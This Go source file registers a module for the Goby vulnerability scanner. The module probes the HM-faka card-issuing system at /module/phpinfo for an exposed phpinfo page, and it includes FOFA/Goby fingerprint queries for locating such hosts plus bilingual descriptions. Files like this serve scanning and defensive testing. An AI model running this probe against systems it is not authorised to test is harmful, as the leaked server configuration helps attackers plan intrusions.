package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "HM-faka /module/phpinfo Information Disclosure Vulnerability",
    "Description": "<p>Red League card issuing system is a software system used to manage the issuance of cards, Visit a specific url to view phpinfo information</p>",
    "Product": "HM-faka",
    "Homepage": "https://github.com/cnmbdb/HM-faka",
    "DisclosureDate": "2024-06-04",
    "PostTime": "2024-06-06",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"assets/shop/dist/uaredirect.js\"",
    "GobyQuery": "body=\"assets/shop/dist/uaredirect.js\"",
    "Level": "1",
    "Impact": "<p>Visit a specific url to view phpinfo information</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:<a href=\"https://github.com/cnmbdb/HM-faka\">https://github.com/cnmbdb/HM-faka</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/module/phpinfo",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "PHP Version",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/module/phpinfo",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/module/phpinfo"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/module/phpinfo",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "PHP Version",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|variable|请访问此页面{{{CRLF}}}{{{fixedhostinfo}}}/module/phpinfo"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.3",
    "Translation": {
        "CN": {
            "Name": "红盟发卡系统 /module/phpinfo 信息泄露漏洞",
            "Product": "红盟发卡系统 ",
            "Description": "<p>红盟发卡系统是一种用于管理发行卡片的软件系统，访问特定url可以查看phpinfo信息<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞： <a href=\"https://github.com/cnmbdb/HM-faka\" target=\"_blank\">https://github.com/cnmbdb/HM-faka</a><br></p>",
            "Impact": "<p>访问特定url可以查看phpinfo信息<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "HM-faka /module/phpinfo Information Disclosure Vulnerability",
            "Product": "HM-faka",
            "Description": "<p>Red League card issuing system is a software system used to manage the issuance of cards, Visit a specific url to view phpinfo information<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:<a href=\"https://github.com/cnmbdb/HM-faka\" target=\"_blank\">https://github.com/cnmbdb/HM-faka</a><br></p>",
            "Impact": "<p>Visit a specific url to view phpinfo information<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10959"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}